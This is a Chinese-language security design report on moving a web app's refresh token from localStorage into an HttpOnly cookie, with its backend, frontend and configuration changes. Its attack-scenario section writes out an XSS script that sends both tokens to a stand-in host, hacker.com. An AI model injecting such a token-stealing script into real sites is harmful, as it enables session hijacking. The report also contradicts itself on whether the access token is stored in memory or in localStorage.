# JWT Refresh Token HttpOnly Cookie 安全优化报告

## 1. 背景

### 1.1 原有方案

```
登录成功后，服务端返回两个 Token：
  - Access Token (JWT, 30分钟有效)
  - Refresh Token (UUID, 7天有效)

前端将两个 Token 都存在 localStorage：
  localStorage.setItem('ai_studio_token', data.token);
  localStorage.setItem('ai_studio_refresh_token', data.refreshToken);
```

### 1.2 安全风险

| 风险 | 说明 |
|------|------|
| **XSS 窃取 Refresh Token** | localStorage 对 JS 完全可读，一旦页面存在 XSS 漏洞，攻击者可注入恶意脚本读取 `localStorage.getItem('ai_studio_refresh_token')`，将 7 天有效的 Refresh Token 发送到自己的服务器 |
| **持久化泄露** | localStorage 永久存储，即使用户关闭浏览器，Token 仍然存在。攻击者可以在任何时候回来再次窃取 |
| **无法主动失效** | Refresh Token 被窃取后，用户完全不知情，攻击者可以在 7 天内持续换取新的 Access Token |

### 1.3 攻击场景

```
1. 攻击者发现评论区存在 XSS 漏洞（未过滤 <script> 标签）
2. 注入恶意脚本：
   <script>
     fetch('https://hacker.com?at=' + localStorage.getItem('ai_studio_token')
         + '&rt=' + localStorage.getItem('ai_studio_refresh_token'));
   </script>
3. 用户访问页面 → 浏览器执行脚本 → 两个 Token 全部泄露
4. 攻击者用 Refresh Token 持续换取新 Access Token，维持 7 天的非法访问
```

## 2. 优化方案

### 2.1 目标

- Refresh Token 放入 HttpOnly Cookie，JS 不可读
- Access Token 继续走响应体，前端存内存变量
- 保持刷新流程不变，用户无感知

### 2.2 Token 存储策略

| Token | 存储位置 | XSS 可窃取 | 有效期 | 说明 |
|-------|---------|-----------|--------|------|
| Access Token | 前端内存变量 | 仅当前页面生命周期 | 30 分钟 | 刷新页面后用 Refresh Token 自动恢复 |
| Refresh Token | HttpOnly Cookie | **不可窃取** | 7 天 | 浏览器自动管理，JS 读不到 |

### 2.3 Cookie 属性设计

```java
ResponseCookie.from("REFRESH_TOKEN", refreshToken)
    .httpOnly(true)        // JS 不可读，防 XSS 窃取
    .secure(cookieSecure)  // 生产环境仅 HTTPS 传输
    .sameSite("Strict")    // 跨站请求不带 Cookie，防 CSRF
    .path("/api/auth")     // 仅在刷新接口带上，缩小暴露面
    .maxAge(7天)           // 与 Refresh Token 有效期一致
```

| 属性 | 值 | 作用 |
|------|-----|------|
| HttpOnly | true | `document.cookie` 读不到，XSS 注入的 JS 无法获取 |
| Secure | true(生产) | 仅通过 HTTPS 传输，防止中间人截获 |
| SameSite | Strict | 跨站请求不带 Cookie，防 CSRF 攻击 |
| Path | /api/auth | Cookie 只在 `/api/auth/*` 请求时发送，其他请求不带 |

## 3. 改动详情

### 3.1 后端改动

#### AuthController.java

| 接口 | 改动 |
|------|------|
| POST /api/auth/login | 响应体不再返回 refreshToken，改为 Set-Cookie 写入 HttpOnly Cookie |
| POST /api/auth/register | 同上 |
| POST /api/auth/refresh | 从 Cookie 读取 refreshToken，不再从 RequestBody 读取 |
| POST /api/auth/logout | **新增**，清除 Cookie + 从 Redis 删除 Refresh Token |

新增辅助方法：
- `addRefreshTokenCookie()` — 写入 Cookie
- `clearRefreshTokenCookie()` — 清除 Cookie（maxAge=0）
- `extractRefreshTokenFromCookie()` — 从请求 Cookie 中提取

#### AuthResponse.java

新增 `withoutRefreshToken()` 方法，返回不含 refreshToken 字段的副本，确保 refreshToken 不出现在 JSON 响应中。

#### AuthService.java

新增 `revokeRefreshToken()` 方法，供 logout 接口调用，从 Redis 中删除 Refresh Token。

### 3.2 前端改动

#### login.html / chat.html / admin.html

| 函数 | 改动 |
|------|------|
| `persistAuth()` | 删除 `localStorage.setItem('ai_studio_refresh_token', ...)` |
| `clearAuthState()` | 删除 `localStorage.removeItem('ai_studio_refresh_token')` |
| `tryRefreshToken()` / `refreshLoginToken()` | 不再从 localStorage 读取 refreshToken，改为 `fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' })`，浏览器自动带上 Cookie |
| `logout()` / `doLogout()` | 新增调用 `POST /api/auth/logout` 清除服务端 Cookie |

### 3.3 配置改动

| 文件 | 改动 |
|------|------|
| application.yml | 新增 `app.auth.cookie-secure` 配置项 |
| docker-compose.prod.yml | 生产环境 `APP_COOKIE_SECURE=true` |
| .env.example | 新增 `APP_COOKIE_SECURE` 说明 |
| gateway/application.yml | 排除路径新增 `/api/auth/logout` |
| WebMvcConfig.java | 拦截器排除路径新增 `/api/auth/logout` |

## 4. 安全效果对比

### 4.1 攻击场景对比

| 场景 | 优化前 | 优化后 |
|------|--------|--------|
| XSS 注入成功 | 偷走 Access Token + Refresh Token | 只能偷走 Access Token（内存变量，当前页面生命周期） |
| 偷到的 Token 有效期 | Access Token 30 分钟 + Refresh Token 7 天 | 仅 Access Token 30 分钟 |
| 能否续期 | 能，用 Refresh Token 持续换新的 | 不能，Refresh Token 在 HttpOnly Cookie 中，JS 读不到 |
| 用户关页面后 | Token 仍在 localStorage，攻击者可再次窃取 | 内存变量清空，Token 失效 |
| CSRF 攻击 | 不受影响（Token 不在 Cookie 中） | SameSite=Strict 阻止跨站携带 Cookie |

### 4.2 纵深防御层次

```
第 1 层：输入过滤 + 模板引擎自动转义 → 阻止 XSS 注入
第 2 层：CSP 安全策略头 → 限制脚本来源
第 3 层：HttpOnly Cookie → 即使 XSS 注入成功，也读不到 Refresh Token
第 4 层：Access Token 内存存储 + 短过期 → 偷到了也只能用 30 分钟
第 5 层：SameSite=Strict → 防 CSRF，跨站请求不带 Cookie
第 6 层：HTTPS (Secure Cookie) → 防传输层窃听
```

## 5. 数据流对比

### 5.1 登录流程

```
优化前：
  响应体 → { token: "xxx", refreshToken: "yyy", ... }
  前端 → localStorage 存两个 Token

优化后：
  响应体 → { token: "xxx", ... }（无 refreshToken）
  Set-Cookie → REFRESH_TOKEN=yyy; HttpOnly; Secure; SameSite=Strict; Path=/api/auth
  前端 → localStorage 只存 Access Token，Cookie 由浏览器自动管理
```

### 5.2 刷新流程

```
优化前：
  前端 → 从 localStorage 读 refreshToken
  请求体 → { "refreshToken": "yyy" }

优化后：
  前端 → fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' })
  请求头 → Cookie: REFRESH_TOKEN=yyy（浏览器自动带上）
  请求体 → 空
```

### 5.3 退出流程

```
优化前：
  前端 → localStorage.clear() → 跳转登录页

优化后：
  前端 → POST /api/auth/logout（服务端清除 Redis + Set-Cookie maxAge=0）
       → localStorage.clear() → 跳转登录页
```

## 6. 配置说明

| 环境 | APP_COOKIE_SECURE | 说明 |
|------|------------------|------|
| 开发 | false | localhost 无 HTTPS，Cookie 不要求 Secure |
| 生产 | true | 必须 HTTPS 才带 Cookie，防止明文传输泄露 |

## 7. 兼容性

- 浏览器兼容性：HttpOnly Cookie 所有主流浏览器均支持
- Spring Cloud Gateway：默认透传 Set-Cookie 头，无需额外配置
- CORS：`allowCredentials: true` 已配置，Cookie 可跨子域携带
- 旧 Token：已登录用户的 localStorage 中残留的 refreshToken 不影响功能，刷新时会自动走 Cookie 流程
